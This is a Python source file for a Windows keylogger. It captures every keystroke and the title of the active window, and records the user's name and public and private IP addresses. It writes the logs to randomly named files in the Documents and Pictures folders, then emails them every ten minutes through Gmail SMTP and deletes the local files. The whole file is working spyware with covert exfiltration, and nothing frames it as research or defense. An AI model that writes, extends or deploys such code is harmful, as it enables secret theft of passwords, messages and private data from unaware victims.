#!/bin/bash

# imports
import os
import time
import random
import requests
import socket
import smtplib
import threading
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import win32gui
import config

# Global variables
public_ip = requests.get('https://api.ipify.org').text  # Fetch public IP using an external service
private_ip = socket.gethostbyname(socket.gethostname())  # Get local IP address
user = os.path.expanduser('~').split('\\')[2]  # Get the current user profile name
datetime = time.ctime(time.time())  # Get current date and time

logged_data = []  # List to store logged keystrokes
delete_file = []  # List to store files that need to be deleted after sending logs

# Log initial data (including public IP, private IP, and user info)
msg = f'[START OF LOGS]\n   *~Date/Time: {datetime}\n   *~User-Profile: {user}\n   *~Public-IP: {public_ip}\n   *~Private-IP: {private_ip}\n\n'
logged_data.append(msg)  # Append log message to the logged_data

# Define key substitution dictionary for special keys
key_substitutions = {
    'Key.enter': '[ENTER]\n',
    'Key.backspace': '[BACKSPACE]',
    'Key.space': ' ',
    'Key.alt_l': '[ALT]',
    'Key.tab': '[TAB]',
    'Key.delete': '[DEL]',
    'Key.ctrl_l': '[CTRL]',
    'Key.left': '[LEFT ARROW]',
    'Key.right': '[RIGHT ARROW]',
    'Key.shift': '[SHIFT]',
    'Key.caps_lock': '[CAPS LK]',
    'Key.cmd': '[WINDOWS KEY]',
    'Key.print_screen': '[PRNT SCR]',
    '\\x03': '[CTRL-C]',
    '\\x16': '[CTRL-V]',
}

def on_press(key):
    """
    Handles key press events and logs the key press with substitutions.
    Improved error handling added to avoid crashes on key press errors.
    """
    try:
        new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())  # Get the active window title
        if new_app == 'Cortana':
            new_app = 'Windows start menu'  # Handle special cases like Cortana

        key_str = str(key).strip("'")  # Convert key to string
        if key_str in key_substitutions:  # Check if the key is in the substitution list
            logged_data.append(key_substitutions[key_str])  # Log the substituted key
        else:
            logged_data.append(key_str)  # Log the regular key
    except Exception as e:
        print(f"[!] Error in on_press: {e}")  # Handle unexpected errors gracefully

def write_file(count):
    """
    Writes logged data to a random file in either the Documents or Pictures folder.
    Improved file path handling using os.path.join() for better cross-platform compatibility.
    """
    filepath = random.choice([os.path.expanduser('~') + '/Documents/', os.path.expanduser('~') + '/Pictures/'])
    filename = f"{count}I{random.randint(1000000, 9999999)}.txt"  # Generate random filename
    file_path = os.path.join(filepath, filename)  # Join path and filename

    delete_file.append(file_path)  # Append the file path to the delete_file list
    
    with open(file_path, 'w') as fp:
        fp.write(''.join(logged_data))  # Write logged data to the file

def send_logs():
    """
    Periodically writes logs to a file and sends them via email.
    Improved exception handling to prevent the program from crashing during email sending.
    """
    count = 0
    from_addr = config.fromAddr
    from_password = config.fromPassword
    to_addr = from_addr  # Send the email to the same address for testing

    MIN = 10  # Minutes interval between log uploads (can be adjusted)
    SEC = 60  # Seconds

    time.sleep(10)  # Wait before starting the loop

    while True:
        if len(logged_data) > 1:  # Proceed only if there's data to send
            try:
                write_file(count)  # Write the logged data to a file

                subject = f'[{user}] ~ {count}'  # Set the email subject
                msg = MIMEMultipart()  # Create a multipart email message
                msg['From'] = from_addr
                msg['To'] = to_addr
                msg['Subject'] = subject
                msg.attach(MIMEText('testing', 'plain'))  # Attach a plain text body

                # Attach the log file
                with open(delete_file[0], 'rb') as attachment:
                    filename = os.path.basename(delete_file[0])  # Get the filename
                    part = MIMEBase('application', 'octet-stream')  # Prepare the attachment
                    part.set_payload(attachment.read())  # Read the attachment data
                    encoders.encode_base64(part)  # Encode the attachment in base64
                    part.add_header('Content-Disposition', f'attachment; filename={filename}')  # Add header
                    msg.attach(part)  # Attach the part to the email

                text = msg.as_string()  # Convert the email message to string format

                # Send email with proper error handling
                with smtplib.SMTP('smtp.gmail.com', 587) as s:
                    s.ehlo()  # Start the connection
                    s.starttls()  # Enable encryption
                    s.login(from_addr, from_password)  # Login using the provided credentials
                    s.sendmail(from_addr, to_addr, text)  # Send the email

                print('Log sent successfully')
                
                # Cleanup: Remove the sent log file and reset the data
                os.remove(delete_file[0])  # Remove the sent file
                del logged_data[:]  # Clear logged data
                del delete_file[0:]  # Remove the deleted file from the list

                count += 1  # Increment the log count

            except Exception as error:
                print(f'[!] send_logs // Error: {error}')  # Log any errors encountered during the process

        time.sleep(MIN * SEC)  # Wait before sending the next log

if __name__ == '__main__':
    # Start the email sending thread (daemonized to ensure it exits when the main program exits)
    threading.Thread(target=send_logs, daemon=True).start()

    # Start listening for key presses using pynput
    with Listener(on_press=on_press) as listener:
        listener.join()  # Wait for the listener to terminate
